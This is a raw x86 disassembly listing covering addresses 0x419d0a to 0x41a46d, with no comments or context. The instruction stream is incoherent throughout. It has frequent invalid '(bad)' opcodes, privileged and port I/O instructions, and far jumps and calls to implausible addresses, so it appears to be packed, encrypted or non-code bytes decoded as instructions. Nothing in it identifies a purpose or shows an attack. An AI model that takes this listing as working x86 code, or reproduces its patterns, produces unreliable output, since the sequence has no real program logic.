  419d0a:	mov    al,ds:0x4a2067e1
  419d0f:	inc    eax
  419d10:	aad    0x1c
  419d12:	(bad)  
  419d13:	aaa    
  419d14:	out    0xfd,al
  419d16:	mov    esi,0x82f21292
  419d1b:	add    DWORD PTR [eax+0x7e],esi
  419d1e:	and    BYTE PTR [esi-0x48],al
  419d21:	adc    al,0x42
  419d23:	test   al,0xc2
  419d25:	aad    0x76
  419d27:	loope  0x419d96
  419d29:	ins    BYTE PTR es:[edi],dx
  419d2a:	dec    ecx
  419d2b:	repz retf 
  419d2d:	sbb    BYTE PTR [esi+0x1d096ce4],0xb9
  419d34:	mov    dh,0x24
  419d36:	cdq    
  419d37:	cmp    al,0xb5
  419d39:	pop    es
  419d3a:	xchg   DWORD PTR [edx+0x7b],edx
  419d3d:	inc    edi
  419d3e:	repz adc eax,0xdc425f26
  419d44:	push   esi
  419d45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d46:	jmp    0x419d27
  419d48:	sbb    cl,BYTE PTR [edx]
  419d4a:	loopne 0x419d57
  419d4c:	loope  0x419dcd
  419d4e:	sahf   
  419d4f:	jl     0x419d26
  419d51:	rcl    BYTE PTR ds:0xca171d45,cl
  419d57:	and    eax,ebp
  419d59:	or     al,0x11
  419d5b:	pop    eax
  419d5c:	xor    ch,ah
  419d5e:	call   0x386cca3f
  419d63:	add    BYTE PTR [esi],ah
  419d65:	sbb    ecx,ecx
  419d67:	leave  
  419d68:	out    0xe2,al
  419d6a:	popa   
  419d6b:	sub    BYTE PTR [edi-0x15],al
  419d6e:	push   ss
  419d6f:	mov    esi,0xe7e0bcb7
  419d74:	pop    es
  419d75:	xor    bh,cl
  419d77:	xor    eax,0x1c6f9edc
  419d7c:	jg     0x419dcf
  419d7e:	test   DWORD PTR ds:0x2ac91879,edx
  419d84:	pop    es
  419d85:	pop    ds
  419d86:	jbe    0x419dcf
  419d88:	mov    ebx,DWORD PTR [edx+0xd]
  419d8b:	daa    
  419d8c:	test   al,0xdf
  419d8e:	sbb    ah,BYTE PTR [edx+0x65]
  419d91:	jno    0x419e07
  419d93:	jae    0x419d26
  419d95:	xor    BYTE PTR [edi],dh
  419d97:	mov    eax,DWORD PTR ds:0x43ef46fa
  419d9d:	mov    ds:0x470cd856,al
  419da2:	pop    es
  419da3:	xor    al,0x9a
  419da5:	pushf  
  419da6:	inc    esp
  419da7:	pop    ss
  419da8:	(bad)  
  419daa:	das    
  419dab:	xor    BYTE PTR [ecx-0x1fb63c44],ah
  419db1:	leave  
  419db2:	cmovb  ebp,DWORD PTR [eax]
  419db5:	mov    eax,ds:0xb0213601
  419dba:	pushf  
  419dbb:	mov    al,0xfe
  419dbd:	test   al,0x59
  419dbf:	add    al,0xd5
  419dc1:	cs sbb ecx,ebp
  419dc4:	mov    edx,0x8f0cd3be
  419dc9:	sub    eax,esp
  419dcb:	dec    esp
  419dcc:	sbb    esi,DWORD PTR [edx]
  419dce:	call   0xf534:0x616a540b
  419dd5:	test   al,0x6a
  419dd7:	in     eax,dx
  419dd8:	in     eax,0x9e
  419dda:	mov    ah,0x1a
  419ddc:	inc    esp
  419ddd:	test   DWORD PTR [eax-0x4e0c0cac],edx
  419de3:	idiv   BYTE PTR [ecx+eiz*8]
  419de6:	(bad)  
  419de7:	xor    DWORD PTR [edi],edx
  419de9:	adc    bl,BYTE PTR [edx+0x60320fb]
  419def:	adc    ch,ah
  419df1:	ins    DWORD PTR es:[edi],dx
  419df2:	pushf  
  419df3:	sbb    bh,BYTE PTR [esi-0x52bf6c12]
  419df9:	and    dl,BYTE PTR [ebp-0xd]
  419dfc:	pop    edi
  419dfd:	mov    WORD PTR [ecx],?
  419dff:	push   ds
  419e00:	pop    ds
  419e01:	jns    0x419e59
  419e03:	inc    ecx
  419e04:	mov    BYTE PTR [edi-0x54520ea6],dh
  419e0a:	stos   DWORD PTR es:[edi],eax
  419e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e0d:	(bad)
  419e10:	clc    
  419e11:	lea    edx,[edi]
  419e13:	inc    esi
  419e14:	cmp    eax,0x4b4562d1
  419e19:	push   0x48
  419e1b:	cs (bad) 
  419e1d:	xlat   BYTE PTR ds:[ebx]
  419e1e:	pop    ds
  419e1f:	jl     0x419e40
  419e21:	icebp  
  419e22:	pop    esi
  419e23:	dec    esi
  419e24:	loopne 0x419e16
  419e26:	ss rcr ah,1
  419e29:	mov    edi,0x5db50a25
  419e2e:	adc    DWORD PTR [edx-0x7f],esp
  419e31:	popa   
  419e32:	outs   dx,BYTE PTR ds:[esi]
  419e33:	(bad)  
  419e34:	mov    bl,0xa6
  419e36:	pop    ss
  419e37:	jae    0x419e6f
  419e39:	shl    BYTE PTR [edi+edi*8-0x2ea286bd],0xd1
  419e41:	jmp    0xf4cb:0xe8447ad4
  419e48:	cmp    eax,0xd76f88c1
  419e4d:	gs mov dh,ah
  419e50:	jae    0x419e3e
  419e52:	pushf  
  419e53:	xchg   ebx,eax
  419e54:	mov    ecx,0xaab23448
  419e59:	xchg   esi,eax
  419e5a:	mov    WORD PTR [ebx-0x5b],?
  419e5d:	cmp    eax,ebx
  419e5f:	and    eax,0x68364051
  419e64:	xchg   esi,eax
  419e65:	enter  0x631a,0x79
  419e69:	mov    gs,WORD PTR [esi-0x5b]
  419e6c:	ror    BYTE PTR [eax+eax*8],cl
  419e6f:	aas    
  419e70:	shr    BYTE PTR [esp+edi*1+0x621bf807],cl
  419e77:	iret   
  419e78:	or     DWORD PTR [ecx],0xf0f728de
  419e7e:	lahf   
  419e7f:	pop    ss
  419e80:	sbb    eax,0xef936f07
  419e85:	je     0x419ebc
  419e87:	lods   eax,DWORD PTR ds:[esi]
  419e88:	(bad)  
  419e89:	pop    ebp
  419e8a:	stos   BYTE PTR es:[edi],al
  419e8b:	adc    eax,0x8653e446
  419e90:	and    cl,BYTE PTR [ebx+0x376dc98f]
  419e96:	idiv   ah
  419e98:	ins    BYTE PTR es:[edi],dx
  419e99:	ret    
  419e9a:	jno    0x419e75
  419e9c:	xchg   DWORD PTR [ebp+0x3fa39a68],ebp
  419ea2:	jmp    0xd8ba4ea3
  419ea7:	cmp    al,0xb8
  419ea9:	shl    BYTE PTR [ebx],0x3f
  419eac:	inc    ebx
  419ead:	mov    fs,WORD PTR [esi+eiz*1]
  419eb0:	add    edi,edi
  419eb2:	ror    DWORD PTR [esi-0x25],1
  419eb5:	cmp    al,0x1
  419eb7:	icebp  
  419eb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419eb9:	or     eax,0xa4067e66
  419ebe:	fdivr  QWORD PTR [edi-0x6e2c8ce6]
  419ec4:	pop    edx
  419ec5:	add    DWORD PTR [ecx+0x2bbfba50],ebp
  419ecb:	mov    ch,0xfa
  419ecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ecf:	enter  0x46c7,0x67
  419ed3:	mov    eax,ds:0x7d7b9fda
  419ed8:	mul    dl
  419eda:	mov    bl,0x1e
  419edc:	test   al,0xdf
  419ede:	out    dx,eax
  419edf:	add    BYTE PTR ds:0x173972cb,al
  419ee5:	add    al,0x28
  419ee7:	pop    es
  419ee8:	pop    edi
  419ee9:	xchg   ecx,eax
  419eea:	or     ah,al
  419eec:	adc    dh,BYTE PTR [edi+0x14]
  419eef:	das    
  419ef0:	pop    edx
  419ef1:	adc    dl,dh
  419ef3:	sub    DWORD PTR [esi-0x14b01317],esi
  419ef9:	not    cl
  419efb:	mov    BYTE PTR [edx],bl
  419efd:	add    dh,BYTE PTR [ebp+0x7c]
  419f00:	iret   
  419f01:	dec    ebp
  419f02:	push   ebx
  419f03:	and    al,0x5
  419f05:	push   ds
  419f06:	(bad)  
  419f08:	test   DWORD PTR [eax-0x58494594],esp
  419f0e:	ins    DWORD PTR es:[edi],dx
  419f0f:	sub    BYTE PTR [edx+0x29dbef4],bl
  419f15:	inc    ecx
  419f16:	cmp    DWORD PTR [ecx+0x4eb5bdb7],0x582e1ab
  419f20:	and    BYTE PTR [edx+edx*1+0x78],0xfd
  419f25:	push   ebp
  419f26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f27:	push   edx
  419f28:	les    esi,FWORD PTR [edi]
  419f2a:	cwde   
  419f2b:	mov    ah,0x37
  419f2d:	jl     0x419f70
  419f2f:	in     al,0xe1
  419f31:	sahf   
  419f32:	dec    esp
  419f33:	dec    ebp
  419f34:	or     DWORD PTR [ebx],edi
  419f36:	mov    WORD PTR [eax+0x7ecd4275],es
  419f3c:	mov    DWORD PTR [ecx+0x6a],ecx
  419f3f:	or     eax,0xc6b33353
  419f44:	out    0x71,al
  419f46:	dec    ecx
  419f47:	mov    bl,0x66
  419f49:	lods   al,BYTE PTR ds:[esi]
  419f4a:	xor    eax,0x71588c08
  419f4f:	push   edx
  419f50:	mov    dl,0xbc
  419f52:	mov    edx,0x7abae81e
  419f57:	and    al,0x7c
  419f59:	xchg   BYTE PTR [eax+0x4e],dl
  419f5c:	int3   
  419f5d:	(bad)  
  419f5e:	data16 mov dl,BYTE PTR [edi+0x31]
  419f62:	add    eax,0x8c49d53
  419f67:	fdiv   DWORD PTR [edi-0x1207f749]
  419f6d:	dec    eax
  419f6e:	loop   0x419ef9
  419f70:	lds    ebx,FWORD PTR [esi]
  419f72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f73:	mov    cl,0x99
  419f75:	daa    
  419f76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f77:	and    al,BYTE PTR [eax-0x62fbde13]
  419f7d:	pop    ecx
  419f7e:	push   ds
  419f7f:	xor    al,0xf0
  419f81:	xchg   esi,eax
  419f82:	push   ebx
  419f83:	ss push ss
  419f85:	hlt    
  419f86:	push   esi
  419f87:	bound  esi,QWORD PTR [ecx+0x21ccd5a7]
  419f8d:	fs xchg ecx,eax
  419f8f:	jae    0x419f46
  419f91:	mov    ds:0xf7b814d1,eax
  419f96:	sub    esp,DWORD PTR [esi+0x55]
  419f99:	bound  edx,QWORD PTR [esi]
  419f9b:	cmp    bl,al
  419f9d:	pop    ebp
  419f9e:	cmp    dh,BYTE PTR [ebp+0x50]
  419fa1:	pop    ebp
  419fa2:	pop    esi
  419fa3:	fmul   DWORD PTR [ecx]
  419fa5:	in     al,dx
  419fa6:	jns    0x419ff9
  419fa8:	dec    ebx
  419fa9:	adc    al,0xeb
  419fab:	arpl   dx,si
  419fad:	clc    
  419fae:	mov    DWORD PTR [esi],esp
  419fb0:	add    dh,BYTE PTR [eax-0x7dc924f2]
  419fb6:	adc    DWORD PTR [ebx+0x4b],ebx
  419fb9:	sub    BYTE PTR [eax+eiz*2+0x1c589c7d],dl
  419fc0:	lods   al,BYTE PTR ds:[esi]
  419fc1:	leave  
  419fc2:	xor    DWORD PTR [eax+0x1badb974],ebx
  419fc8:	fist   WORD PTR [eax+0x6]
  419fcb:	and    bh,BYTE PTR [esi]
  419fcd:	ss loop 0x419f8b
  419fd0:	neg    BYTE PTR ds:0xb93dbe76
  419fd6:	jl     0x419fab
  419fd8:	dec    edx
  419fd9:	dec    esp
  419fda:	sub    edx,DWORD PTR [ebx-0x7d]
  419fdd:	std    
  419fde:	sbb    ah,BYTE PTR [edi-0x5469fb8d]
  419fe4:	fs aaa 
  419fe6:	mov    ebx,DWORD PTR [edi+ecx*8]
  419fe9:	int    0xfa
  419feb:	sub    ch,0x62
  419fee:	loop   0x419fa1
  419ff0:	clc    
  419ff1:	mov    DWORD PTR [ebx],eax
  419ff3:	dec    edx
  419ff4:	xor    eax,0x2c8f4a97
  419ff9:	adc    dh,BYTE PTR [eax-0x56]
  419ffc:	ss jb  0x3340a0c
  41a003:	xor    ebx,DWORD PTR [eax-0x45b8416a]
  41a009:	sbb    BYTE PTR [edx],dh
  41a00b:	cmp    edi,esi
  41a00d:	test   bh,cl
  41a00f:	fnstenv [eax]
  41a011:	es pop es
  41a013:	pop    ds
  41a014:	sbb    al,0x4b
  41a016:	div    bh
  41a018:	loopne 0x419fe2
  41a01a:	shl    DWORD PTR fs:[eax+ebx*2+0xd5243b5],cl
  41a022:	iret   
  41a023:	mov    bl,al
  41a025:	pop    ebx
  41a026:	ret    
  41a027:	add    cl,al
  41a029:	xchg   ebp,eax
  41a02a:	cld    
  41a02b:	js     0x419faf
  41a02d:	inc    ecx
  41a02e:	dec    esp
  41a02f:	call   0xeafc:0x1313707c
  41a036:	(bad)  
  41a037:	icebp  
  41a038:	out    0xe1,al
  41a03a:	xchg   DWORD PTR [edi+0x245ccb56],ebp
  41a040:	mov    esi,DWORD PTR [esi]
  41a042:	int3   
  41a043:	cmc    
  41a044:	mov    ds:0x888d389d,eax
  41a049:	ror    esi,0xe3
  41a04c:	adc    DWORD PTR [ecx+eax*2],edx
  41a04f:	cld    
  41a050:	sbb    al,0xc4
  41a052:	push   esp
  41a053:	sbb    DWORD PTR [ebp+0x4],ebx
  41a056:	pop    es
  41a057:	adc    al,0x2d
  41a059:	ja     0x41a06f
  41a05b:	les    esi,FWORD PTR [edx]
  41a05d:	mov    bh,0x98
  41a05f:	and    BYTE PTR ds:0x68969805,dh
  41a065:	push   es
  41a066:	adc    al,BYTE PTR [edx]
  41a068:	cwde   
  41a069:	jne    0x41a01f
  41a06b:	xchg   ebx,eax
  41a06c:	jne    0x41a086
  41a06e:	cdq    
  41a06f:	imul   esi,DWORD PTR [ebx],0xd
  41a072:	jle    0x41a0f0
  41a074:	jecxz  0x419fff
  41a076:	add    ebx,eax
  41a078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a079:	push   0x11e4399c
  41a07e:	inc    ebx
  41a07f:	inc    ecx
  41a080:	outs   dx,DWORD PTR ds:[esi]
  41a081:	sbb    dh,BYTE PTR [ecx+0x623156c6]
  41a087:	mov    dh,0x1d
  41a089:	or     cl,BYTE PTR [ebx-0x7a]
  41a08c:	sub    ebx,DWORD PTR ds:0x4c24167f
  41a092:	xor    esp,DWORD PTR [ebx]
  41a094:	pop    esp
  41a095:	pop    eax
  41a096:	hlt    
  41a097:	aad    0x60
  41a099:	loope  0x41a04c
  41a09b:	dec    eax
  41a09c:	or     BYTE PTR [ebp+0x74b35ecd],bl
  41a0a2:	push   ds
  41a0a3:	scas   al,BYTE PTR es:[edi]
  41a0a4:	or     al,0x12
  41a0a6:	and    BYTE PTR [edi-0x5080a66c],bh
  41a0ac:	test   DWORD PTR [ecx+0x2e],esi
  41a0af:	(bad)  
  41a0b0:	sub    al,0x8f
  41a0b2:	pusha  
  41a0b3:	lea    edi,[ebx]
  41a0b5:	ficom  DWORD PTR [eax+0x77a592f8]
  41a0bb:	jecxz  0x41a04e
  41a0bd:	xor    bl,dh
  41a0bf:	in     eax,dx
  41a0c0:	sti    
  41a0c1:	jle    0x41a06f
  41a0c3:	out    0x1c,eax
  41a0c5:	cwde   
  41a0c6:	dec    ebx
  41a0c7:	xchg   DWORD PTR [ebp+0x6983f7c6],esi
  41a0cd:	push   edi
  41a0ce:	neg    ecx
  41a0d0:	js     0x41a105
  41a0d2:	sub    BYTE PTR [eax],ah
  41a0d4:	shr    BYTE PTR [edx+0x50aeb5d1],1
  41a0da:	or     al,0xad
  41a0dc:	(bad)  [ebx-0x42]
  41a0df:	test   DWORD PTR [edx],esi
  41a0e1:	cld    
  41a0e2:	pop    ss
  41a0e3:	mov    DWORD PTR [eax-0x6b98b5b1],edi
  41a0e9:	das    
  41a0ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0eb:	fdivr  st,st(1)
  41a0ed:	aad    0x9
  41a0ef:	clc    
  41a0f0:	ret    
  41a0f1:	mov    ecx,0x438dc9fc
  41a0f6:	push   edx
  41a0f7:	daa    
  41a0f8:	imul   edi,DWORD PTR [ecx-0x44b6a984],0x6c
  41a0ff:	in     eax,0xaa
  41a101:	pusha  
  41a102:	and    al,0x1e
  41a104:	sahf   
  41a105:	shl    ecx,cl
  41a107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a108:	addr16 pop ebp
  41a10a:	jg     0x41a096
  41a10c:	into   
  41a10d:	add    bl,al
  41a10f:	and    DWORD PTR [ecx],ecx
  41a111:	pusha  
  41a112:	or     ebp,DWORD PTR [esi+edi*1]
  41a115:	out    0x26,al
  41a117:	jno    0x41a11c
  41a119:	das    
  41a11a:	xchg   edx,eax
  41a11b:	jne    0x41a11b
  41a11d:	jecxz  0x41a123
  41a11f:	out    0x55,eax
  41a121:	push   ecx
  41a122:	(bad)  
  41a123:	shl    cl,1
  41a125:	les    ebx,FWORD PTR [eax-0x1c]
  41a128:	inc    edx
  41a129:	fsubr  QWORD PTR [edi+0x55c12b]
  41a12f:	outs   dx,BYTE PTR ds:[esi]
  41a130:	fcompp 
  41a132:	fld    QWORD PTR [ecx+ecx*8+0x4b]
  41a136:	pop    ecx
  41a137:	jne    0x41a12e
  41a139:	jae    0x41a0ec
  41a13b:	xchg   DWORD PTR [ebp+ebp*2+0x4b],ebp
  41a13f:	fadd   QWORD PTR [eax]
  41a141:	lock repnz imul esp,DWORD PTR [esi],0x3f
  41a146:	pop    eax
  41a147:	iret   
  41a148:	adc    ch,bh
  41a14a:	clc    
  41a14b:	lods   al,BYTE PTR ds:[esi]
  41a14c:	mov    al,0x3
  41a14e:	shl    DWORD PTR [edx-0x2e4a6889],0x68
  41a155:	fild   QWORD PTR [edi-0x4bab98ea]
  41a15b:	into   
  41a15c:	xor    BYTE PTR [edi],dh
  41a15e:	mov    cl,0xcf
  41a160:	dec    ecx
  41a161:	sahf   
  41a162:	dec    esp
  41a163:	(bad)  
  41a164:	repnz mov esi,0x1c1230b7
  41a16a:	scas   eax,DWORD PTR es:[edi]
  41a16b:	cmp    eax,0xfd208036
  41a170:	jns    0x41a1a4
  41a172:	push   cs
  41a173:	in     eax,dx
  41a174:	push   ebx
  41a175:	sbb    al,BYTE PTR [eax+0x68]
  41a178:	sub    DWORD PTR [esi+0x79],ebx
  41a17b:	add    dl,dh
  41a17d:	(bad)  
  41a17e:	int3   
  41a17f:	bound  eax,QWORD PTR ds:0x61ac3474
  41a185:	xor    DWORD PTR [ecx-0x7bda6894],eax
  41a18b:	cmp    ebx,edi
  41a18d:	stos   BYTE PTR es:[edi],al
  41a18e:	inc    ebp
  41a18f:	and    eax,0x7a3800ec
  41a194:	inc    edi
  41a195:	push   ds
  41a196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a197:	call   0x9920194c
  41a19c:	fcmove st,st(5)
  41a19e:	xchg   ecx,eax
  41a19f:	cdq    
  41a1a0:	pop    ds
  41a1a1:	mov    ebp,0xb5d7ad11
  41a1a6:	mov    fs,WORD PTR [edi]
  41a1a8:	jl     0x41a1d9
  41a1aa:	sub    edx,esi
  41a1ac:	imul   BYTE PTR [esi+0x65b1f319]
  41a1b2:	out    0xad,eax
  41a1b4:	lock sub al,0x74
  41a1b7:	in     al,dx
  41a1b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1b9:	adc    al,0x90
  41a1bb:	in     eax,dx
  41a1bc:	push   0xffffffad
  41a1be:	dec    edi
  41a1bf:	aas    
  41a1c0:	int    0xee
  41a1c2:	call   0x8e67:0xcba71205
  41a1c9:	mov    dh,0x86
  41a1cb:	push   eax
  41a1cc:	inc    esp
  41a1cd:	dec    ebx
  41a1ce:	mov    esi,0x5c93805c
  41a1d3:	jg     0x41a210
  41a1d5:	paddusb mm0,QWORD PTR [ebx+0x2c]
  41a1d9:	xor    eax,0xcbc6e0cc
  41a1de:	nop
  41a1df:	dec    DWORD PTR [ebx+0x129b9a0b]
  41a1e5:	or     BYTE PTR [edx],dl
  41a1e7:	push   edi
  41a1e8:	dec    ecx
  41a1e9:	into   
  41a1ea:	test   eax,0x2d5a54ca
  41a1ef:	cmp    eax,0xe4ff289
  41a1f4:	je     0x41a213
  41a1f6:	jge    0x41a254
  41a1f8:	mov    bl,0xb1
  41a1fa:	mov    edi,0xc972221
  41a1ff:	or     al,0xe4
  41a201:	pusha  
  41a202:	imul   DWORD PTR [eax+eiz*2-0x7438488a]
  41a209:	pop    edx
  41a20a:	jae    0x41a259
  41a20c:	pop    esp
  41a20d:	dec    esi
  41a20e:	dec    edi
  41a20f:	cli    
  41a210:	stos   DWORD PTR es:[edi],eax
  41a211:	in     al,dx
  41a212:	nop
  41a213:	(bad)  
  41a214:	jle    0x41a247
  41a216:	cs into 
  41a218:	xor    BYTE PTR ds:0x2cec98d5,ah
  41a21e:	in     al,0xca
  41a220:	lahf   
  41a221:	outs   dx,DWORD PTR ds:[esi]
  41a222:	es xor al,0x41
  41a225:	adc    ebp,0xc7ca5bf9
  41a22b:	lahf   
  41a22c:	sbb    eax,0x116d11c4
  41a231:	ds mov edx,0xecb0ad63
  41a237:	dec    ebx
  41a238:	retf   
  41a239:	push   edi
  41a23a:	hlt    
  41a23b:	pop    eax
  41a23c:	out    0xe7,al
  41a23e:	add    eax,0xb9810d80
  41a243:	addr16 into 
  41a245:	outs   dx,BYTE PTR ds:[esi]
  41a246:	mov    ds:0x177451b8,al
  41a24b:	inc    esi
  41a24c:	ins    DWORD PTR es:[edi],dx
  41a24d:	hlt    
  41a24e:	and    dl,bl
  41a250:	cmc    
  41a251:	ss inc edi
  41a253:	xor    BYTE PTR [edi+0x58],ah
  41a256:	mov    edx,0x3f0e745a
  41a25b:	fisubr WORD PTR [ebx-0x15]
  41a25e:	pop    ds
  41a25f:	sti    
  41a260:	in     eax,0x1b
  41a262:	sub    eax,0xf993e835
  41a267:	push   ds
  41a268:	dec    ebx
  41a269:	lock push eax
  41a26b:	loope  0x41a2cd
  41a26d:	cmc    
  41a26e:	cmp    ecx,DWORD PTR [ecx+0x1699ff59]
  41a274:	and    dh,BYTE PTR [ebx+0x3f]
  41a277:	(bad)  
  41a278:	xlat   BYTE PTR ds:[ebx]
  41a279:	mov    esp,0x4195b848
  41a27e:	jo     0x41a266
  41a280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a281:	imul   BYTE PTR [ebx]
  41a283:	mov    ebx,0x194f0b77
  41a288:	in     al,dx
  41a289:	or     ecx,DWORD PTR [edx+0x7f0ba1d3]
  41a28f:	retf   
  41a290:	imul   ebx,DWORD PTR [edx],0xffffff91
  41a293:	adc    eax,esp
  41a295:	daa    
  41a296:	repnz mov al,ds:0xbcd93271
  41a29c:	icebp  
  41a29d:	inc    ebp
  41a29e:	inc    edi
  41a29f:	fist   DWORD PTR [esi+0x56]
  41a2a2:	push   0xb66b4f41
  41a2a7:	sbb    al,0x2b
  41a2a9:	fimul  DWORD PTR [ebp-0x48f10ea9]
  41a2af:	jmp    0xdb9d:0xffe945c3
  41a2b6:	cmp    al,0xab
  41a2b8:	jae    0x41a2db
  41a2ba:	push   esi
  41a2bb:	xchg   edx,eax
  41a2bc:	fistp  QWORD PTR [esi-0x7e]
  41a2bf:	pop    esp
  41a2c0:	pop    es
  41a2c1:	xchg   DWORD PTR [edx+0x2443aff0],edx
  41a2c7:	adc    cl,BYTE PTR [eax]
  41a2c9:	dec    ebx
  41a2ca:	or     DWORD PTR [ebp-0x9],esp
  41a2cd:	cmp    al,0x1c
  41a2cf:	mov    edx,0xdc00b6d1
  41a2d4:	lds    edi,FWORD PTR [esi+eiz*2+0x7b6e8554]
  41a2db:	pop    esi
  41a2dc:	xchg   edi,eax
  41a2dd:	outs   dx,BYTE PTR ds:[esi]
  41a2de:	pop    ecx
  41a2df:	xchg   BYTE PTR [ebx-0x41fdb224],cl
  41a2e5:	adc    esi,DWORD PTR [ebx+0x525905f6]
  41a2eb:	xor    bl,BYTE PTR [eax]
  41a2ed:	adc    BYTE PTR [ebp-0xb],ch
  41a2f0:	arpl   WORD PTR [edi-0x54],bx
  41a2f3:	ins    DWORD PTR es:[edi],dx
  41a2f4:	(bad)  
  41a2f5:	loop   0x41a32d
  41a2f7:	int    0xdd
  41a2f9:	lea    ebp,[ebx-0xdc1461d]
  41a2ff:	outs   dx,DWORD PTR ds:[esi]
  41a300:	mov    ebp,0x852dc2e3
  41a305:	(bad)  
  41a307:	clc    
  41a308:	adc    DWORD PTR [esi],0xffffffe0
  41a30b:	mov    al,0x66
  41a30d:	(bad)  
  41a30e:	cli    
  41a30f:	or     al,0xac
  41a311:	daa    
  41a312:	pushf  
  41a313:	fimul  WORD PTR [edx-0x568b078b]
  41a319:	ss retf 0x8362
  41a31d:	inc    esi
  41a31e:	jmp    0xf51a0fb3
  41a323:	xor    al,0x7d
  41a325:	push   ecx
  41a326:	and    eax,0x915d6f7
  41a32b:	hlt    
  41a32c:	xchg   ebx,eax
  41a32d:	and    eax,0x74b1e804
  41a332:	hlt    
  41a333:	sub    esi,ebp
  41a335:	or     BYTE PTR [ebx+ebx*1],0xd4
  41a339:	jl     0x41a2f8
  41a33b:	add    ecx,DWORD PTR [ecx-0x78]
  41a33e:	sub    BYTE PTR [edx+0x3c],cl
  41a341:	xor    eax,0xce5f92fe
  41a346:	cdq    
  41a347:	mov    ds:0xace7501c,eax
  41a34c:	int3   
  41a34d:	lea    ebx,[edx+0x4f]
  41a350:	(bad)  
  41a351:	jecxz  0x41a3c9
  41a353:	mov    cl,0x13
  41a355:	dec    esi
  41a356:	sbb    dh,bh
  41a358:	xchg   ebp,eax
  41a359:	ficomp WORD PTR [edi-0xd]
  41a35c:	inc    eax
  41a35d:	fdiv   st,st(1)
  41a35f:	sub    DWORD PTR fs:[edi],eax
  41a362:	mov    edi,0x6480ddf0
  41a367:	and    cl,BYTE PTR [ecx+edx*8+0x3225b3c1]
  41a36e:	dec    eax
  41a36f:	dec    edx
  41a370:	jnp    0x41a3d9
  41a372:	pop    esp
  41a373:	mov    ds:0xa3ca334b,eax
  41a378:	pop    ss
  41a379:	fidiv  WORD PTR [edx]
  41a37b:	jae    0x41a334
  41a37d:	mov    esi,DWORD PTR [ebx+0x65]
  41a380:	jmp    0x8d74:0x91a1db2c
  41a387:	lds    ecx,FWORD PTR [ebx+0x75186068]
  41a38d:	add    DWORD PTR ds:0x6dbb4e51,edx
  41a393:	push   0x5febad42
  41a398:	add    dl,BYTE PTR [edx+0x41cbe41d]
  41a39e:	popf   
  41a39f:	jl     0x41a405
  41a3a1:	push   ecx
  41a3a2:	(bad)  
  41a3a3:	fcmovbe st,st(4)
  41a3a5:	inc    DWORD PTR [ebp+0x70]
  41a3a8:	leave  
  41a3a9:	mov    dh,0xdd
  41a3ab:	rcr    BYTE PTR [edx],cl
  41a3ad:	cmp    eax,DWORD PTR [esi+eiz*8-0x68]
  41a3b1:	lock test BYTE PTR [ebx],0xb5
  41a3b5:	and    DWORD PTR ds:0xe9f97dea,ebp
  41a3bb:	bound  edi,QWORD PTR [ebx+0x12]
  41a3be:	mov    edx,0x724bedac
  41a3c3:	not    ch
  41a3c5:	fs retf 0x19c
  41a3c9:	pop    esp
  41a3ca:	lods   eax,DWORD PTR ds:[esi]
  41a3cb:	sti    
  41a3cc:	es popa 
  41a3ce:	sub    eax,0x2353a998
  41a3d3:	je     0x41a3a3
  41a3d5:	mov    ch,0xe1
  41a3d7:	out    dx,eax
  41a3d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3d9:	add    bh,BYTE PTR [ebx]
  41a3db:	ins    BYTE PTR es:[edi],dx
  41a3dc:	pusha  
  41a3dd:	fstp   st(3)
  41a3df:	(bad)  
  41a3e0:	lock dec edx
  41a3e2:	or     al,0x68
  41a3e4:	sbb    eax,0xc5ab2a77
  41a3e9:	fdivr  QWORD PTR [edi-0x654fb918]
  41a3ef:	iret   
  41a3f0:	jae    0x41a3fd
  41a3f2:	pushf  
  41a3f3:	and    al,0xa9
  41a3f5:	add    BYTE PTR [ecx+eiz*4-0x2b9c81bf],bh
  41a3fc:	jno    0x41a455
  41a3fe:	xchg   esi,eax
  41a3ff:	fwait
  41a400:	jo     0x41a412
  41a402:	fldenv [edx-0x6d]
  41a405:	mov    eax,0xde76beb5
  41a40a:	pop    ds
  41a40b:	wbinvd 
  41a40d:	xchg   esp,eax
  41a40e:	cli    
  41a40f:	inc    eax
  41a410:	add    DWORD PTR [edi-0x11],esp
  41a413:	push   ebp
  41a414:	or     BYTE PTR [ebx+0x74],dl
  41a417:	jmp    0xe8a1:0xf0593fc5
  41a41e:	lahf   
  41a41f:	lods   al,BYTE PTR ds:[esi]
  41a420:	call   0x4a995089
  41a425:	data16 jge 0x41a3da
  41a428:	pop    ebp
  41a429:	push   0x692e2ecc
  41a42e:	pop    ds
  41a42f:	fisttp DWORD PTR [ecx-0x29]
  41a432:	leave  
  41a433:	fadd   DWORD PTR [ebp+0x2b]
  41a436:	jns    0x41a438
  41a438:	push   esp
  41a439:	or     al,0xc3
  41a43b:	pusha  
  41a43c:	in     eax,dx
  41a43d:	neg    DWORD PTR [edi+0x5b]
  41a440:	jns    0x41a41f
  41a442:	ficom  DWORD PTR ds:0xe2f1c0dc
  41a448:	mov    dh,0x89
  41a44a:	jno    0x41a407
  41a44c:	dec    ebp
  41a44d:	inc    DWORD PTR [eax]
  41a44f:	push   edx
  41a450:	repnz test al,0xaf
  41a453:	cli    
  41a454:	push   ebp
  41a455:	jge    0x41a4a6
  41a457:	cmp    al,0xea
  41a459:	xor    dl,BYTE PTR [ecx-0x78]
  41a45c:	jb     0x41a3fd
  41a45e:	scas   al,BYTE PTR es:[edi]
  41a45f:	mov    edx,0x4dc91f1e
  41a464:	sbb    eax,0x8ef4b53
  41a469:	cmp    DWORD PTR [ecx],ebx
  41a46b:	inc    esp
  41a46c:	pop    edi
  41a46d:	push   cs
